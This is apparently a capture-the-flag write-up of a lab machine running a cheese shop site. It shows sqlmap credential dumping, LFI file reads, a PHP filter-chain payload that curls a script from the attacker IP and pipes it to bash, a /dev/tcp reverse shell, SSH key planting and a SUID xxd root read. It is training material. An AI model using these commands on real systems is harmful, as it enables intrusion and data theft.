## Target IP: `10.10.111.197`

---

### Environment Setup

Set local variables:

```bash
export IP=10.10.111.197
export LIP=10.6.24.56
```

---

### Recon

Ran a full Nmap scan:

```bash
sudo nmap -sC -sV -T4 -p- -O $IP -oN nmap_scan.txt
```

Started a Nikto scan:

```bash
nikto -h http://$IP
```

Started a ffuf scan:

```bash
ffuf -u http://$IP/FUZZ -w /usr/share/wordlists/dirb/common.txt -e php
```

Open ports:

- Found a webserver.

The site is a cheese shop. Nothing interesting in the source code. Footer said "info@thecheeseshop.com", added `thecheeseshop.com` to `/etc/hosts`, but it pointed to the same page.

ffuf results:

- `/images` directory with three cheese images.
- Downloaded them all with `wget` for possible stego work later.

---

### Web App Testing

Found a login page. Tried basic SQLi, no success. Decided to throw sqlmap at it anyway.

Saved the login request from Burpsuite into `login.req` and launched sqlmap:

```bash
sqlmap -r login.req --batch --dbs
```

Databases found:

- `information_schema`
- `users`

Pulled tables from `users`:

```bash
sqlmap -r login.req -D users --tables --batch
```

Single table: `users`

Pulled column names:

```bash
sqlmap -r login.req -D users --columns --batch
```

Columns:

- `id`
- `username`
- `password`

Dumped usernames and passwords:

```bash
sqlmap -r login.req -D users -C password,username --dump --batch
```

Result:

| Username | Password |
| --- | --- |
| comte | [REDACTED] |

MD5 hash, didn't crack it yet because there was an easier way in.

---

### Hidden URL & LFI

While sqlmap was running, found an interesting URL:

```
http://thecheeseshop.com/secret-script.php?file=supersecretadminpanel.html
```

Tried basic LFI:

```
file=/etc/passwd
```

Success. Read `/etc/passwd`.

Started fuzzing `file=` parameter:

```bash
ffuf -u "http://thecheeseshop.com/secret-script.php?file=FUZZ" -w lfi-wordlist.txt > lfi_fuzzing.txt
```

Used a wordlist from [here](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt).

Cleaned the fuzzing output:

```bash
awk 'index($0, "Size: 0") == 0' lfi_fuzzing.txt > tmp && mv tmp lfi_fuzzing.txt
awk '{ gsub(/\x1b\[2K/, ""); print }' lfi_fuzzing.txt > tmp && mv tmp lfi_fuzzing.txt
awk '{ sub(/\[Status:.*/, ""); print }' lfi_fuzzing.txt > tmp && mv tmp lfi_fuzzing.txt
awk 'NF' lfi_fuzzing.txt > tmp && mv tmp lfi_fuzzing.txt
```

After cleanup, found:

- `/etc/apache2/mods-enabled/mime.conf`
- `/etc/apache2/ports.conf`
- `/etc/apache2/sites-enabled/000-default.conf`
- `/etc/apt/sources.list`
- `/etc/bash.bashrc`

No real logs found to poison. Wanted to see `login.php` without executing it.

Used PHP filters:

```
php://filter/convert.base64-encode/resource=login.php
```

Decoded it on CyberChef. Found hardcoded database credentials:

- Username: `comte`
- Password: `[REDACTED]`
- Database: `users`

Saw weak input sanitization: strips "OR" from username field, but that was it. Passwords are MD5 hashed. Nothing preventing me from just logging in directly.

---

### Shell Access

Found an exploit path using a filter chain attack.

Made a revshell payload:

```bash
echo "bash -i >& /dev/tcp/10.6.24.56/4444 0>&1" > revshell
```

Generated a PHP filter chain:

```bash
python3 php_filter_chain_generator.py --chain '<?= `curl -s -L 10.6.24.56/revshell|bash` ?>'
```

Got a monstrous chain like:

```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...
```

Set up:

```bash
sudo python3 -m http.server 80
nc -lvnp 4444
```

Triggered the filter chain and caught a shell as `www-data`.

---

### Enumeration and Privilege Escalation

Found `/home/comte/user.txt` — no permissions yet.

Uploaded and ran `linpeas`:

On attack box:

```bash
cp /opt/linpeas/linpeas.sh .
python3 -m http.server 80
```

On victim:

```bash
wget http://10.6.24.56:80/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Found writable files:

- `/etc/systemd/system/exploit.timer`
- `/home/comte/.ssh/authorized_keys`

Skipped timers for now. Went for the writable SSH keys.

Generated SSH key:

```bash
ssh-keygen -t rsa -b 2048 -f comte-key
```

Pasted the public key into authorized_keys:

```bash
echo "<comte-key.pub contents>" >> /home/comte/.ssh/authorized_keys
```

Logged in as `comte`:

```bash
ssh -i comte-key comte@$IP
```

Read `user.txt`:

```
THM{[REDACTED]}
```

---

### Root Access

Checked sudo permissions:

```bash
sudo -l
```

Allowed to run:

- `/bin/systemctl daemon-reload`
- `/bin/systemctl restart exploit.timer`
- `/bin/systemctl start exploit.timer`
- `/bin/systemctl enable exploit.timer`

Read the service config.

Found that `exploit.service` copied the `xxd` binary to `/opt/` and set the SUID bit. Once the timer fired, anyone could run `/opt/xxd` with root privileges.

Started the exploit timer:

```bash
sudo /bin/systemctl start exploit.timer
```

Waited a few seconds, then:

```bash
cd /opt
ls -l
```

Saw `xxd` with SUID bit set.

Used GTFOBins trick to read root’s files:

```bash
LFILE=/root/root.txt
./xxd "$LFILE" | xxd -r
```

Got root flag:

```
THM{[REDACTED]}
```
